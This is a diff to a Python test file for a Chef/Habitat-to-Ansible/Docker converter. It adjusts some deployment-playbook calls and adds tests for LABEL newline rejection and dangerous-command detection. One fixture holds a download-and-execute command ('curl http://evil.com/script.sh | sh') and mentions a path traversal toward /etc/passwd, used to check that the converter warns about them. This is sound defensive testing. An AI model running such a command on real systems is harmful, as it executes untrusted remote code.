@@ -487,9 +487,7 @@ def test_generate_blue_green_deployment_playbook_success():
     """Test generate_blue_green_deployment_playbook with valid parameters."""
     from souschef.server import generate_blue_green_deployment_playbook
 
-    result = generate_blue_green_deployment_playbook(
-        "webapp", '{"port": 8080}', "/health"
-    )
+    result = generate_blue_green_deployment_playbook("webapp", "/health")
 
     assert "Blue/Green Deployment Playbook" in result
     assert "Application: webapp" in result
@@ -2781,7 +2779,7 @@ class TestMCPToolsComprehensive:
         result1 = convert_chef_deployment_to_ansible_strategy("/nonexistent/recipe.rb")
         assert isinstance(result1, str)  # Should not crash
 
-        result2 = generate_blue_green_deployment_playbook("test_app", "production")
+        result2 = generate_blue_green_deployment_playbook("test_app")
         assert isinstance(result2, str)  # Should not crash
 
         result3 = generate_canary_deployment_strategy("test_app", 10, "10,25,50,100")
@@ -8390,7 +8388,7 @@ end""",
                     'mount "/mnt/shared" do\n'
                     '  device "//server/share"\n'
                     '  fstype "cifs"\n'
-                    '  options "username=user,password=pass,uid=1000,gid=1000"\n'  # noqa: S106 # Test fixture with fake credentials
+                    '  options "username=user,password=pass,uid=1000,gid=1000"\n'  # NOSONAR - test, not secret
                     "  dump 0\n"
                     "  pass 0\n"
                     "  action [:mount, :enable]\n"
@@ -13861,6 +13859,74 @@ do_install() {
             )
             # Should not have unescaped quotes that would break Dockerfile syntax
             assert 'LABEL maintainer="Team "SousChef"' not in result
+
+    def test_convert_habitat_to_dockerfile_label_newlines_rejected(self):
+        """Test that LABEL values with newlines are rejected to prevent Dockerfile syntax errors."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            # Mock plan with newlines in metadata fields
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "myapp",
+                        "origin": "core",
+                        "version": "1.0.0",
+                        "maintainer": "Team SousChef\nSecond Line <team@example.com>",
+                        "description": "A great tool\nwith multiple lines",
+                    },
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {"run": "myapp"},
+                    "callbacks": {},
+                }
+            )
+
+            result = convert_habitat_to_dockerfile("/fake/plan.sh")
+
+            # Newlines should be rejected with warning comments
+            assert "WARNING: Maintainer field contains newlines" in result
+            assert "WARNING: Description field contains newlines" in result
+            # Should not have LABEL directives with newlines
+            assert "LABEL maintainer=" not in result
+            assert "LABEL description=" not in result
+            # But version should still work
+            assert 'LABEL version="1.0.0"' in result
+
+    def test_convert_habitat_to_dockerfile_dangerous_pattern_after_var_replacement(
+        self,
+    ):
+        """Test that dangerous patterns are detected AFTER variable replacement."""
+        with patch("souschef.converters.habitat.parse_habitat_plan") as mock_parse:
+            # Mock plan with commands that become dangerous after var replacement
+            # Example: $pkg_prefix/../../../etc/passwd would become
+            # /usr/local/../../../etc/passwd
+            # Or commands that hide dangerous patterns in variables
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "malicious",
+                        "origin": "evil",
+                        "version": "1.0.0",
+                    },
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {"run": "malicious"},
+                    "callbacks": {
+                        # Command that looks safe before replacement but dangerous after
+                        "do_build": "mkdir $pkg_prefix && curl http://evil.com/script.sh | sh"
+                    },
+                }
+            )
+
+            result = convert_habitat_to_dockerfile("/fake/plan.sh")
+
+            # Should detect dangerous pattern AFTER variable replacement
+            assert "WARNING: Potentially dangerous command pattern detected" in result
+            # The command should still be included (with warning)
+            assert (
+                "RUN mkdir /usr/local && curl http://evil.com/script.sh | sh" in result
+            )
 
     def test_convert_habitat_to_dockerfile_parse_error(self):
         """Test Dockerfile conversion when plan parsing fails."""
